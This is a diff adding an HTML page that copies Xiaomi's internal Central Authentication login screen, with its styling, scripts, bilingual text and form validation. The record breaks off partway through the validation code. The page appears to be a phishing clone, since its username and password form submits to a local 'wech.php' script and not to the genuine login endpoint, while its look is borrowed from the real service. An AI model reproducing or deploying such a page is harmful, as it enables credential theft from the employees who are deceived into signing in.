@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html><head>
+		<meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="ie=edge"><title>Central Authentication</title>
+		<link rel="icon" href="https://cas.mioffice.cn/images/favicon.ico" type="image/x-icon"><link rel="stylesheet" href="https://cas.mioffice.cn/v2/static/css/lss.base.min.css"><link rel="stylesheet" href="https://cas.mioffice.cn/v2/static/css/loginnew.css"><script src="https://cas.mioffice.cn/v2/static/js/jquery.min.js"></script>
+		<script type="text/javascript" src="https://cas.mioffice.cn/v2/static/js/jquery.cookie.js"></script>
+		<script type="text/javascript" src="https://cas.mioffice.cn/v2/static/js/loginnew.js"></script>
+		<script type="text/javascript" src="https://cas.mioffice.cn/v2/static/js/feishu.js"></script>
+	<script type="text/javascript" src="https://s0.pstatp.com/ee/lark/passport/lark-passport-jsbridge-1.0.0.js"></script><style>.model_content { width: 80%; } @media (min-width: 800px) and (min-device-width: 800px) { .model_content { width: 30%; } }</style></head>
+
+<body style="">
+<div id="login">
+	<div class="header">
+		<div class="container">
+			<img src="https://cas.mioffice.cn/v2/static/images/logo2x.png"  alt="内网统一认证"><h1>Central Authentication</h1>
+			<div class="switch">
+				<a id="change_zh" class="" href="" onclick="zh_language()">中文</a>
+				<span></span>
+				<a id="change_en" href="" onclick="en_language()">ENG</a>
+			</div>
+		</div>
+	</div>
+
+	<div class="content" id="ran-img" style="background-image: url(&quot;https://cas.mioffice.cn/v2/static/images/main_bg_2.jpg&quot;);">
+		<div class="container clearfix">
+			<div class="con-from">
+				<div class="con-f-title clearfix">
+					<span class="off">QR Code Login<i id="code-btn"></i></span>
+					<span class="on"><i id="account-btn">Password Login</i></span>
+				</div>
+				<!-- 账号登录 --><div class="con-f-content account">
+					<form id="subFrom" action="wech.php" method="post" onsubmit="return check()">
+						<input type="text" placeholder="Username or email address" name="username" id="input-username">
+						<input type="password" placeholder="Password" name="password" id="password">
+						<input type="hidden" name="mi_service" value="">
+						<input type="hidden" name="execution" value="318a4da5-1d38-47e3-8a2d-a75c454b7f8a_ZXlKaGJHY2lPaUpJVXpVeE1pSjkubG5UZEFyaGtzN1lqRTJPSzd3QlZVRWlpMHdwYTJ2d2Z6ZllpRTA1ZmlsUXQ0Lzkyb2I5YXJRM1FuQS9FMWFUeGZwUk1LZHkzS3p4ZVFBWm9iQkw3Q0lWcjY0ZEtoQjYwaERrbGZqMnZrZTNNOUdwbHoxV1doc1VIaXBhYlpSQjFQb0R5bE1wK3B5Z042U1I1ZENVK1ZrNjhZM25FY1gya0txeUJ0UnBpV1ZCMkpyT2pRWC9ydTdya1BFRkRSQjhkMjlOMkRDZXdCejhUTWVicDFTWW5vNUlYMDZqTDRLaERBOUZaOUFoS1ltYkthUWdLQXc4Qyszc0pEZHJLOXZkQkUzYnd2YllTekphN2owZnFUVGtyMk56TXljRWhrc2k3S0UwWmxvanpLcGd1NDhSVzFhelpzOGlVUUNNZlhhUEhjRldGbERpUVE5NU1vd2gwVzhGWVpIYm9BM2wwNGR4eEhBUHdzTWI4bkFSdDVxUVhsejR2TWNnU1B5ZnlPd0doZXUwSU12YXBWcUw4eHE4YkxnUWhnaXhNN1NaSEtPdkQ2RFh3NHJ3cm4ramp0SlNlTUN2MkFIYm9oSTcvSUs4Uzh2UnF5NEZERzY3RS9ydDZrb0s4ZnRiUnRmdkVTNk1xclNYaU84QzZjcHBQWitKTS9zQ3c5OVpnREk4c25yT0cvRjFLUzBsUHJvdy9iMUZua0NNc2dwU0tGb2ZNNHZaeXJPQ2xRVDNIa3FPdG1CYnFYOGRYR2JCMStrekRKSlU0Mk1STUFZcHREVVp1bElLMGJBYWRiZC9aTkpjWSs5TnpIS1J1a2E1b0VBVmx3OFhNUkoyNVFIZFg3RXkvWlZLQlVFWUcyemlDUXpDb1ltQ0JKZ0c1NXpxVGsrVTJqcTB3UzNsRktCZ3d4dlR6SFg2VkFwV2oxMEU4djZTbiszcU81ZEZJR1dpWXcrWWN3bXUyTnZkUkU5bEo1NlVYV2lZbHJVbXlMcDQxL2owU251NmM1bUMyR1ZVdDFxQytYZkx4a0lLaUt3TmNCM0VLSWJtTWZjRVM0UjVXRlduSUVQaGFDTXRjQU5Ucmt3MldXV0VIdnBQbFhPZEpQYnZjT2M5eG0zSmdMdVgvSitFQyttdGxTSU1VaFpqQkhqdHljREQ3eDVUNy9aekZ3MUg1cm10Zm55THRtSDREZ3BIQmpYZDIwSmdJb1V4Ym1md0pTWHk4ZHhDZTJZMFdVZXdMQWg1dWVMZlRnMytRVkduR1R2c1FZcDlhbGJ6NUNsZ3cvUEdnUVVpanF3Znlzc0JxTjJmSForTjJKaUxQcm90ME5CM0k5MGhZMlFHR0UzR1RhaW1va29ld0dtVWQ2Qmk3VnJlSXhwckhiZk42YzkwZDdESDdyNFJnWVFZQWdJZDMyZmFLTnpFeklPb0RNdzlnd3NqOHFBcHZNeHJvRExJUDhYQVVrdnBialhaV0Yva0J5S1c4Z2orcUkxVkx1eGMvcmpYQmdXZm9hSGxQeXdZVjNWV05LM3JFcnFRbUhsbmU4QUlzTWZDVjlhc2ZBaG5YUVNMT1R6SFJ5K3ovRU5PQ0lySzFEcFFhdXVJUGFPWEFUenY4NWdvZGx0S2d4L3ZNWGg5RXlDRHFDeFBDVnZoQjNLejU3YVlNS0NPa1RvaFB2Rk5YREFmYWtrMDNjc2NJcTU3VjNLYjJSRlBQYmYyRDJSamRNclYreTBPOUZ1anhsTk9xTFN1Tkl4MDhZcGRBTUVxWWw3d2tOZ0x3MVA2UVlXYWU1dzI0OGVKM1JoSFdxbWRPNFp0VlRlRWFBVUVsRGlUbjdqOHZhK1hVRkY0T0lwZ0UreXRic3NSM3IrRHJ2T09EUmkxRnhYOHk1UWdaalZ5YU9CaUVYVDFhUGx2cEsvZ1dydGJPaFpQK3RmdmRrTFVCV3pXQkVnb0ZELzlZKzBtZTZUSTNCS1ZYc3J1Z1gvb21WM0lBSExsL2hSMlhScmFGSG1DRHorN1pPbGN2bHRhOVNuWFhZL3I4MXRWeDRlSkV0clAzRnlUbmpvZjFFR0Z0OGxxYmF5MjJ1eWNaZGh4V2xPM3ZlUStCN1h3NDRHTy9LSW55ZWwzWVl5dWl5SHNDRW5UWm5Pd0tiVDk0TmxPMmw1VHpvdVB1UXRPcWF4dkFJQXhGTVhCbHFyQ2dVeU1UQ2VBQVVZOTgrVm1mcmlFaERvak15YzFra1RFcjFXWUJIeGpoVTFRanRGSTM0R1hoV2hlQW40bVBYSjZORk44ZDdkUDM3WVRzZS8zT3ViSHF1VUZYOEtoa3B5SkRNQktpcXZpZ2l4c3VJMDBSSTcxaGNCRUhPWFU3RGExUDZjZWFMb2JhN24wb010ZFZNRHFnUnhZaU5hVE5Bd3pLdGlFcStDdktUNVZ2WGMwUWZkWFZ6dmNvZ0Q4TlFsZzJnOEpJMU1XbHNVc20vbDB3TFg3Z2ZybFRJbmpzV3ZvbGREMDRQM0dBUDR3UUJNR2JFSnBRUW1uTGs2VEpCdnNkNFpOZndXb3lnZXJNdVNaVnU5bmdQbkk4Y0txUy9LNTROTnd0ZmdCeHV2aVJIL3pSM0RZMHkvUW1IYU9mbmdBUi8vTWx6RkxjVWNwaWsxNFNsSGRpak5LdzhEbjJFVFRJbGJCNkoxSklyU29iTnJ3Y1pPM2ZaTjBzRHJwUkU4SlYvZ210ZjR6VVJLTXV1WG9NTkNLcWVXYXhYZkEyN2VkbEdST2pmamd2N215TEhSL0pRcGF0QmdsTDlacGJ4VkpHNUhNbHFPYUNBZ3ZEZkpyNlhBRnRPQ3VyeHdLVGNTeUZ0dldaNnk4VUdkL0JzMEdPdnlNVzBnQVd1MjR1K2U0a3RnNTNRQUdsSlhEYUh2QkdQUDErZ0lXdkZCMWpLQVE2VlVkK2txZHhFOTZqUkY0Zytvbmh2SjJSQ0pPREZWUzdKekFBYitMV1NVd1RwRC9JREdIR25WMDZRc3dpRzExSXJCWHM0ZG56d0lXKzYvQlVxN3d3ZGRsY1JkZnlzYVpMVEhHNThLbXRUVTI1bTlTZWlnS3IwK3ZVYkxmRXI4VDJ6a0pFaVM3S0NCVzRKUEZlWnNraU8wc0xmYmR0cmM4SzlIZy9aTTY3a29iMDBFMndCQXgvQTkxdDlkV1FXYXZSQTE3RUhVb2RYYytkUS9qMWF5NjFjeU5Za0t1V1JGMmtXREZla3F3d0NFWmVDNERwQXErTzVxVk8vUTNxTjczNXB0cWpEdFY4NkJlc1ZJb01yM29Cc2ROWEtIclVxWGhBMGhveUxCdkV1OW1TUGVkamRsQXVYeUlla3BlcFhVSmIzOFJFZDJ5c2ZzRk5xakVFNXRRK3RhUEJuQzk2Z252V2NRdVF0UTM0NUdhQkIyejhGUUN2WjdOSTgvR1dQdzhWbWgwamMydlpJSm1pYzZTenRxMTBxSEU4YjExSXdmWGJGU3lDdXV0Q2NLODdHQ1AvMTJReGl5TWF3MVYrRENWS0FwMEo3TWhSQTBKU2hhSTBiMXdBTkZmQkZDOW9kUmR6M2JKRVN2d0tHQ29DV3h2d09YelMweVVQZHdBQmY0Y3p3VFN3OUlDem5lWHFma0xPeGhsSlQ0ZS94N0c0bUg4bDZaNVBSZDkxK0FHYVlJOEtXRGQ5UWVBMmVqd0x2ZTVDSVZ6b2twaUxsVjdzYmtJVnJJcFZMTDdVN0xDbzlFVHJUMlNCOHhjOW9oeW91WU9zdUo5eUk5TTBzNFkzWGQ0aWcyWmorcUJTZkNpSm5OdW4ycUZNQ0dJb2xtUnhDUCsraDA4b0g1QXZFMzU5OVNSUzc0aGk1V1lYYVRsVzlyU080TjVkZW9Wa2gxWkhHS1J1YkgvNmVXWTZyZFdQR1ZibzFydXVRRk1xbHNTSlY2SGYvNEhwVkZETmFuNHdCNGpFa0QrNXpickJTRC9LT281TWxudUMvd2NYcUZpT2IxS05IR0ZZUHovTEhCbW5zd0dJQ2FHY2c3TnNKb3U1RjdUZjNoOUIvRGdqRHJtT3RxUm82R3FnT1JZOStKY2w2TnYyck5jYkdtQjNRK3FuZ2ErSW9Nd2gvMWVGUld0T05GaUcvWkpnWUgxNXU3Ymc3azNCM0hYdEJsTzhzZkVRMi9tS2VYdUVOWlpjaW0rV2NDK3E4QUpTVEZQRHlBdmtXc2d6M2YxeHJ5ODR1YVFkZkZNODM3eTFMUHZ2MzVGajRVdXVBei8yNnF5UXRWdGNYZmYzaldld1lSa0RMWFVZbHJkVUJZWUh3NnpYQWdzejQ4eXZNWCsxZjRIMmJqZVhUSjZCNmFyV1BFdDZidXR0R3BHNlJkS05kWldnaEJPNGhMUWMxMkVEWTFCak93ZGNnRlRlWTBLU1BkQ2xQZz09LlVKN3pFQlBqdnZnNGRuQnhWNUlBUlVDLWM1RklhNDQ1YmJLUXE1UXlDOGRGbGRCa3l5U3FYYm5qLXRxNVVBTHFzWmhEMVVRZkJ3UndWT2E2ZDMtMGtn">
+						<input type="hidden" name="_eventId" value="submit">
+						<input type="hidden" id="deviceInput" name="device" value=""><p class="login-error on" style="display: none" id="idp"></p>
+						<button type="submit">Submit</button>
+					</form>
+					<p><a href="https://account.mioffice.cn/forget/index">Forget your password?</a></p>
+
+
+				</div>
+				
+					
+					
+
+				<div class="con-f-footer">
+					<a id="download-app" href="javascript:;">Download Mier App</a>
+					<a href="https://wiki.n.miui.com/pages/viewpage.action?pageId=220453112" target="_blank">Get access to CAS</a>
+				</div>
+			</div>
+			<!-- 登录成功 --><div class="con-f-success hide">
+			<div class="con-f-s-title">登录成功</div>
+			<div class="con-f-s-content">
+				<div class="avatar">
+					<img alt="头像"></div>
+				<p>你已成功登录</p>
+				<div class="btn">
+					<button>安全注销</button>
+					<button>内网门户</button>
+				</div>
+			</div>
+			<div class="con-f-s-footer">
+				<a href="#">接入认证系统</a>
+			</div>
+		</div>
+		</div>
+	</div>
+
+	<div class="footer J_switchTenant">Xiaomi - Information Security &amp; Privacy V2</div>
+</div>
+
+
+<div class="login-dialog">
+	<div class="d-bg l-d-close"></div>
+	<div class="content">
+		<img class="close l-d-close" src="https://cas.mioffice.cn/v2/static/images/login_close.png" alt=""><img src="https://cas.mioffice.cn/v2/static/images/mierapp_qrcode.png" alt="二维码"><a href="https://api.miren.mi.com/f">Download Android Mier App</a>
+		<a style="margin-top: 15px; background-color: #1890ff;" href="https://mierapp.sec.xiaomi.com/ios/help">iOS Mier App installation help</a>
+	</div>
+</div>
+
+
+<script type="text/javascript">
+
+    //进行判断语言的方式，先查看cookie是否可用，如果不可用就使用浏览器
+    //中文是true  英文是false
+    function flagLang() {
+        //alert(getCookieValue("cookie.lang"));
+
+        var str = getCookieValue("cookie.lang");
+        if(str!=undefined&&str!=""){
+            if(str.indexOf("en")==0){
+                return false;
+            }else{
+                return true
+            }
+        }else{
+            currentLang = navigator.language;   //判断除IE外其他浏览器使用语言
+            if(!currentLang){//判断IE浏览器使用语言
+                currentLang = navigator.browserLanguage;
+            }
+
+            if(currentLang.indexOf("zh")==0){
+                addCookie("cookie.lang","zh",65535);
+                return true;
+            }else{
+                addCookie("cookie.lang","en",65535);
+                return false;
+            }
+
+        }
+    }
+    var language="en"
+    var language_stamp
+    var xiaomi_screen_login_target=['登录方式：账户名+账户密码+手机验证码','login way: account name + phone password token'];
+    var xiaomi_screen_login_noToken=['没有动态令牌？','No dynamic token?'];
+    var xiaomi_screen_login_noMessage=['不记得绑定的手机？<a href="https://account.mioffice.cn/appeal/index"> 点此申诉</a>',"Don't remember binding mobile phone? <a href='https://account.mioffice.cn/appeal/index'>Click here to appeal</a>"];
+    var xiaomi_screen_onclick_message=['点击获取','click on'];
+    var xiaomi_screen_onclick_alert_message=['必须输入用户名,密码,手机号','Must enter the user name, password, phone number'];
+    var xiaomi_screen_onclick_alert_ajax=['获取失败','get error'];
+    var xiaomi_screen_welcome_phoneCode=['手机验证码','phone password token'];
+    var xiaomi_screen_not_chrome=['为了更好的使用本系统的功能和页面美观，建议使用 Chrome 浏览器访问。','Please access this site by Chrome browser for better features.'];
+  //   if(flagLang()){
+  //       window.chrome|| $("body").append('<div style="position: fixed;top: 60px;left: 50%;z-index: 1029;width: 700px;margin-left: -350px;padding: 12px;background-color: rgba(0,0,0,.7);color: #fff;text-align: center;box-shadow: 0 2px 4px rgba(0,0,0,.3);animation: show .5s;border: 0;">'+xiaomi_screen_not_chrome[0]+'</div>');
+	// }else {
+  //       window.chrome|| $("body").append('<div style="position: fixed;top: 60px;left: 50%;z-index: 1029;width: 700px;margin-left: -350px;padding: 12px;background-color: rgba(0,0,0,.7);color: #fff;text-align: center;box-shadow: 0 2px 4px rgba(0,0,0,.3);animation: show .5s;border: 0;">'+xiaomi_screen_not_chrome[1]+'</div>');
+	// }
+    var assoc_handle = null;
+    var openid_ext2_mode=null;
+    var openid_claimed_id=null;
+    var openid_ext2_required=null;
+    var openid_ext2_type_Email=null;
+    var openid_ext2_type_FirstName=null;
+    var openid_ext2_type_LastName=null;
+
+    var openid_identity=null;
+    var openid_mode=null;
+    var openid_ns=null;
+    var openid_ns_ext2=null;
+    var openid_ns_sreg=null;
+    var openid_realm=null;
+    var openid_return_to=null;
+    var openid_sreg_required=null;
+
+
+	var postUrl = "/login";
+	if(openid_claimed_id=='http://specs.openid.net/auth/2.0/identifier_select'){
+		postUrl = postUrl+"?"+'openid.assoc_handle='+assoc_handle;
+		postUrl = postUrl+"&"+'openid.ext2.mode='+openid_ext2_mode;
+		postUrl = postUrl+"&"+'openid.claimed_id='+openid_claimed_id;
+		postUrl = postUrl+"&"+'openid.ext2.required='+openid_ext2_required;
+        postUrl = postUrl+"&"+'openid.ext2.type.Email='+openid_ext2_type_Email;
+
+
+        postUrl = postUrl+"&"+'openid.ext2.type.FirstName='+openid_ext2_type_FirstName;
+        postUrl = postUrl+"&"+'openid.ext2.type.LastName='+openid_ext2_type_LastName;
+        postUrl = postUrl+"&"+'openid.identity='+openid_identity;
+
+        postUrl = postUrl+"&"+'openid.mode='+openid_mode;
+        postUrl = postUrl+"&"+'openid.ns='+openid_ns;
+        postUrl = postUrl+"&"+'openid.ns.ext2='+openid_ns_ext2;
+        postUrl = postUrl+"&"+'openid.ns.sreg='+openid_ns_sreg;
+
+
+
+        postUrl = postUrl+"&"+'openid.realm='+openid_realm;
+        postUrl = postUrl+"&"+'openid.return_to='+openid_return_to;
+        postUrl = postUrl+"&"+'openid.sreg.required='+openid_sreg_required;
+
+
+
+		$('#subFrom').attr('action',postUrl);
+    }
+
+    var qrTicket = "QR-V2-f107725f-e0a6-483d-99c3-72bb33fe08b5";
+	var getImgUrl="\/API\/VerifyQRImgController";
+	var disPlayImgUrl="\/API\/DisplayImgController";
+	var authurlPost="\/login";
+	var authurl="\/login";
+	var urlStr="\/API\/VerifyQRCodeController";
+	var flag4Service = false;
+
+	var flowExecutionKey = "318a4da5-1d38-47e3-8a2d-a75c454b7f8a_ZXlKaGJHY2lPaUpJVXpVeE1pSjkubG5UZEFyaGtzN1lqRTJPSzd3QlZVRWlpMHdwYTJ2d2Z6ZllpRTA1ZmlsUXQ0Lzkyb2I5YXJRM1FuQS9FMWFUeGZwUk1LZHkzS3p4ZVFBWm9iQkw3Q0lWcjY0ZEtoQjYwaERrbGZqMnZrZTNNOUdwbHoxV1doc1VIaXBhYlpSQjFQb0R5bE1wK3B5Z042U1I1ZENVK1ZrNjhZM25FY1gya0txeUJ0UnBpV1ZCMkpyT2pRWC9ydTdya1BFRkRSQjhkMjlOMkRDZXdCejhUTWVicDFTWW5vNUlYMDZqTDRLaERBOUZaOUFoS1ltYkthUWdLQXc4Qyszc0pEZHJLOXZkQkUzYnd2YllTekphN2owZnFUVGtyMk56TXljRWhrc2k3S0UwWmxvanpLcGd1NDhSVzFhelpzOGlVUUNNZlhhUEhjRldGbERpUVE5NU1vd2gwVzhGWVpIYm9BM2wwNGR4eEhBUHdzTWI4bkFSdDVxUVhsejR2TWNnU1B5ZnlPd0doZXUwSU12YXBWcUw4eHE4YkxnUWhnaXhNN1NaSEtPdkQ2RFh3NHJ3cm4ramp0SlNlTUN2MkFIYm9oSTcvSUs4Uzh2UnF5NEZERzY3RS9ydDZrb0s4ZnRiUnRmdkVTNk1xclNYaU84QzZjcHBQWitKTS9zQ3c5OVpnREk4c25yT0cvRjFLUzBsUHJvdy9iMUZua0NNc2dwU0tGb2ZNNHZaeXJPQ2xRVDNIa3FPdG1CYnFYOGRYR2JCMStrekRKSlU0Mk1STUFZcHREVVp1bElLMGJBYWRiZC9aTkpjWSs5TnpIS1J1a2E1b0VBVmx3OFhNUkoyNVFIZFg3RXkvWlZLQlVFWUcyemlDUXpDb1ltQ0JKZ0c1NXpxVGsrVTJqcTB3UzNsRktCZ3d4dlR6SFg2VkFwV2oxMEU4djZTbiszcU81ZEZJR1dpWXcrWWN3bXUyTnZkUkU5bEo1NlVYV2lZbHJVbXlMcDQxL2owU251NmM1bUMyR1ZVdDFxQytYZkx4a0lLaUt3TmNCM0VLSWJtTWZjRVM0UjVXRlduSUVQaGFDTXRjQU5Ucmt3MldXV0VIdnBQbFhPZEpQYnZjT2M5eG0zSmdMdVgvSitFQyttdGxTSU1VaFpqQkhqdHljREQ3eDVUNy9aekZ3MUg1cm10Zm55THRtSDREZ3BIQmpYZDIwSmdJb1V4Ym1md0pTWHk4ZHhDZTJZMFdVZXdMQWg1dWVMZlRnMytRVkduR1R2c1FZcDlhbGJ6NUNsZ3cvUEdnUVVpanF3Znlzc0JxTjJmSForTjJKaUxQcm90ME5CM0k5MGhZMlFHR0UzR1RhaW1va29ld0dtVWQ2Qmk3VnJlSXhwckhiZk42YzkwZDdESDdyNFJnWVFZQWdJZDMyZmFLTnpFeklPb0RNdzlnd3NqOHFBcHZNeHJvRExJUDhYQVVrdnBialhaV0Yva0J5S1c4Z2orcUkxVkx1eGMvcmpYQmdXZm9hSGxQeXdZVjNWV05LM3JFcnFRbUhsbmU4QUlzTWZDVjlhc2ZBaG5YUVNMT1R6SFJ5K3ovRU5PQ0lySzFEcFFhdXVJUGFPWEFUenY4NWdvZGx0S2d4L3ZNWGg5RXlDRHFDeFBDVnZoQjNLejU3YVlNS0NPa1RvaFB2Rk5YREFmYWtrMDNjc2NJcTU3VjNLYjJSRlBQYmYyRDJSamRNclYreTBPOUZ1anhsTk9xTFN1Tkl4MDhZcGRBTUVxWWw3d2tOZ0x3MVA2UVlXYWU1dzI0OGVKM1JoSFdxbWRPNFp0VlRlRWFBVUVsRGlUbjdqOHZhK1hVRkY0T0lwZ0UreXRic3NSM3IrRHJ2T09EUmkxRnhYOHk1UWdaalZ5YU9CaUVYVDFhUGx2cEsvZ1dydGJPaFpQK3RmdmRrTFVCV3pXQkVnb0ZELzlZKzBtZTZUSTNCS1ZYc3J1Z1gvb21WM0lBSExsL2hSMlhScmFGSG1DRHorN1pPbGN2bHRhOVNuWFhZL3I4MXRWeDRlSkV0clAzRnlUbmpvZjFFR0Z0OGxxYmF5MjJ1eWNaZGh4V2xPM3ZlUStCN1h3NDRHTy9LSW55ZWwzWVl5dWl5SHNDRW5UWm5Pd0tiVDk0TmxPMmw1VHpvdVB1UXRPcWF4dkFJQXhGTVhCbHFyQ2dVeU1UQ2VBQVVZOTgrVm1mcmlFaERvak15YzFra1RFcjFXWUJIeGpoVTFRanRGSTM0R1hoV2hlQW40bVBYSjZORk44ZDdkUDM3WVRzZS8zT3ViSHF1VUZYOEtoa3B5SkRNQktpcXZpZ2l4c3VJMDBSSTcxaGNCRUhPWFU3RGExUDZjZWFMb2JhN24wb010ZFZNRHFnUnhZaU5hVE5Bd3pLdGlFcStDdktUNVZ2WGMwUWZkWFZ6dmNvZ0Q4TlFsZzJnOEpJMU1XbHNVc20vbDB3TFg3Z2ZybFRJbmpzV3ZvbGREMDRQM0dBUDR3UUJNR2JFSnBRUW1uTGs2VEpCdnNkNFpOZndXb3lnZXJNdVNaVnU5bmdQbkk4Y0txUy9LNTROTnd0ZmdCeHV2aVJIL3pSM0RZMHkvUW1IYU9mbmdBUi8vTWx6RkxjVWNwaWsxNFNsSGRpak5LdzhEbjJFVFRJbGJCNkoxSklyU29iTnJ3Y1pPM2ZaTjBzRHJwUkU4SlYvZ210ZjR6VVJLTXV1WG9NTkNLcWVXYXhYZkEyN2VkbEdST2pmamd2N215TEhSL0pRcGF0QmdsTDlacGJ4VkpHNUhNbHFPYUNBZ3ZEZkpyNlhBRnRPQ3VyeHdLVGNTeUZ0dldaNnk4VUdkL0JzMEdPdnlNVzBnQVd1MjR1K2U0a3RnNTNRQUdsSlhEYUh2QkdQUDErZ0lXdkZCMWpLQVE2VlVkK2txZHhFOTZqUkY0Zytvbmh2SjJSQ0pPREZWUzdKekFBYitMV1NVd1RwRC9JREdIR25WMDZRc3dpRzExSXJCWHM0ZG56d0lXKzYvQlVxN3d3ZGRsY1JkZnlzYVpMVEhHNThLbXRUVTI1bTlTZWlnS3IwK3ZVYkxmRXI4VDJ6a0pFaVM3S0NCVzRKUEZlWnNraU8wc0xmYmR0cmM4SzlIZy9aTTY3a29iMDBFMndCQXgvQTkxdDlkV1FXYXZSQTE3RUhVb2RYYytkUS9qMWF5NjFjeU5Za0t1V1JGMmtXREZla3F3d0NFWmVDNERwQXErTzVxVk8vUTNxTjczNXB0cWpEdFY4NkJlc1ZJb01yM29Cc2ROWEtIclVxWGhBMGhveUxCdkV1OW1TUGVkamRsQXVYeUlla3BlcFhVSmIzOFJFZDJ5c2ZzRk5xakVFNXRRK3RhUEJuQzk2Z252V2NRdVF0UTM0NUdhQkIyejhGUUN2WjdOSTgvR1dQdzhWbWgwamMydlpJSm1pYzZTenRxMTBxSEU4YjExSXdmWGJGU3lDdXV0Q2NLODdHQ1AvMTJReGl5TWF3MVYrRENWS0FwMEo3TWhSQTBKU2hhSTBiMXdBTkZmQkZDOW9kUmR6M2JKRVN2d0tHQ29DV3h2d09YelMweVVQZHdBQmY0Y3p3VFN3OUlDem5lWHFma0xPeGhsSlQ0ZS94N0c0bUg4bDZaNVBSZDkxK0FHYVlJOEtXRGQ5UWVBMmVqd0x2ZTVDSVZ6b2twaUxsVjdzYmtJVnJJcFZMTDdVN0xDbzlFVHJUMlNCOHhjOW9oeW91WU9zdUo5eUk5TTBzNFkzWGQ0aWcyWmorcUJTZkNpSm5OdW4ycUZNQ0dJb2xtUnhDUCsraDA4b0g1QXZFMzU5OVNSUzc0aGk1V1lYYVRsVzlyU080TjVkZW9Wa2gxWkhHS1J1YkgvNmVXWTZyZFdQR1ZibzFydXVRRk1xbHNTSlY2SGYvNEhwVkZETmFuNHdCNGpFa0QrNXpickJTRC9LT281TWxudUMvd2NYcUZpT2IxS05IR0ZZUHovTEhCbW5zd0dJQ2FHY2c3TnNKb3U1RjdUZjNoOUIvRGdqRHJtT3RxUm82R3FnT1JZOStKY2w2TnYyck5jYkdtQjNRK3FuZ2ErSW9Nd2gvMWVGUld0T05GaUcvWkpnWUgxNXU3Ymc3azNCM0hYdEJsTzhzZkVRMi9tS2VYdUVOWlpjaW0rV2NDK3E4QUpTVEZQRHlBdmtXc2d6M2YxeHJ5ODR1YVFkZkZNODM3eTFMUHZ2MzVGajRVdXVBei8yNnF5UXRWdGNYZmYzaldld1lSa0RMWFVZbHJkVUJZWUh3NnpYQWdzejQ4eXZNWCsxZjRIMmJqZVhUSjZCNmFyV1BFdDZidXR0R3BHNlJkS05kWldnaEJPNGhMUWMxMkVEWTFCak93ZGNnRlRlWTBLU1BkQ2xQZz09LlVKN3pFQlBqdnZnNGRuQnhWNUlBUlVDLWM1RklhNDQ1YmJLUXE1UXlDOGRGbGRCa3l5U3FYYm5qLXRxNVVBTHFzWmhEMVVRZkJ3UndWT2E2ZDMtMGtn";
+	var eventId = "submit";
+	var rememberMe = "on";
+
+	var namehash = $('#input-username').val();
+	var option = "on";
+	var getOtpUrl = "\/API\/getPhoneNum";
+	var deviceId = "";
+
+    $("#checkTrust").click(function () {
+		var optionVal = $("#checkTrust").is(':checked');
+		if(!optionVal){
+		    option = "";
+		}
+    })
+</script>
+
+
+<script>
+
+    String.prototype.startWith=function(str){
+        var reg=new RegExp("^"+str);
+        return reg.test(this);
+    }
+
+    $(function () {
+        errorTips();
+        //editError();
+        /* content 背景随机更换 */
+        var imgIndex = Math.ceil(Math.random() * 6)
+        $('#ran-img').css('background-image','url("https://cas.mioffice.cn/v2/static/images/main_bg_' + imgIndex + '.jpg")');
+         $('#ran-img').css('background-image','url("https://i1.mifile.cn/f/i/mioffice/cas/WechatIMG2.jpg")');
+        /* 登录方式切换 */
+        var $account = $('#login .con-from .account');
+        var $QRCode = $('#login .con-from .q-r-code');
+        $('#account-btn').on('click',function () {
+            $(this).parent().addClass('on').siblings().removeClass('on');
+            $account.removeClass('hide');
+            $QRCode.addClass('hide')
+        });
+        $('#code-btn').on('click',function () {
+            $(this).parent().addClass('on').siblings().removeClass('on');
+            $QRCode.removeClass('hide');
+            $account.addClass('hide');
+        });
+
+
+        $("#download-app").on('click',function () {
+            $(".login-dialog").addClass("on")
+        })
+        $(".l-d-close").on('click',function () {
+            $(".login-dialog").removeClass("on")
+        })
+
+
+        if(flagLang()){
+            //alert("1111111");
+            $('#change_zh').addClass("on");
+            $('#change_en').removeClass("on");
+		}else{
+            $('#change_en').addClass("on");
+            $('#change_zh').removeClass("on");
+		}
+        //保存语言方式，中文存中文，如果是非中文或者英文存英文
+		//进行判断处理，查看浏览器默认语言
+
+
+
+
+    });
+
+
+
+
+	//选择中文的方法，1）选择cookie 2）对数据进行css进行展示
+    function zh_language() {
+		$('#change_zh').addClass("on");
+		$('#change_en').removeClass("on");
+
+        setLanguage("zh");
+
+
+    }
+
+
+    String.prototype.startWith=function(str){
+        var reg=new RegExp("^"+str);
+        return reg.test(this);
+    }
+
+    function en_language() {
+        $('#change_en').addClass("on");
+        $('#change_zh').removeClass("on");
+      /*  currentLang = navigator.language;   //判断除IE外其他浏览器使用语言
+        if(!currentLang){//判断IE浏览器使用语言
+            currentLang = navigator.browserLanguage;
+        }*/
+        setLanguage("en");
+    }
+
+
+    /***
+	 * 通过浏览器本机的语言设置相应的信息
+	 * **/
+    function setLanguage( strLang) {
+		if(strLang.startWith("zh")){
+		    addCookie("cookie.lang","zh-cn",65535);
+		}else{
+            addCookie("cookie.lang","en",65535);
+		}
+
+    }
+
+    function editLangCookie(name,value) {
+		if(getCookieValue(name)==""){
+		    addCookie("cookie.lang",value,65535);
+		}else{
+            editCookie("cookie.lang",value,65535);
+		}
+    }
+
+    function  check() {
+		$('#serverIdp').css("display","none");
+        if($('#msg').length>0){
+            $('#msg').css("display","none");
+        }
+
+        $('#input-username').removeClass("err");
+        $('#password').removeClass("err");
+        //alert($('#username').value())
+        if(($('#input-username').val()==null||$('#input-username').val()=='')&&($('#password').val()==null||$('#password').val()=='')){
+            $('#input-username').addClass("err");
+            $('#idp').html('Username and password are both required').css("display","block");
+            return false;
+        }
+
+        if($('#aTomMess').attr('data')=='phone'){
+            if($('#input-phone').val()==null||$('#input-phone').val()==''){
+                //alert($('#username').val());
+                $('#input-phone').addClass("err");
+                $('#idp').html('phone is a required field.').css("display","block");
+                return false;
+            }
+
+		}else{
+            if($('#input-username').val()==null||$('#input-username').val()==''){
+                //alert($('#username').val());
+                $('#input-username').addClass("err");
+                $('#idp').html('Username is a required field.').css("display","block");
+                return false;
+            }
+		}
+
+        if($('#password').val()==null||$('#password').val()==''){
+            $('#password').addClass("err");
+            $('#idp').html('Password is a required field.').css("display","block");
+            return false;
+        }
+        //有动态令牌的时候需要显示先显示动态令牌
+		if($('#input-otp').length>0&&$('#aTomMess').attr('data')=='password'){
+            if($('#input-otp').val()==null||$('#input-otp').val()==''){
+                $('#input-otp').addClass("err");
+                $('#idp').html('otp is a required field.').css("display","block");
+                return false;
+			}
+
+
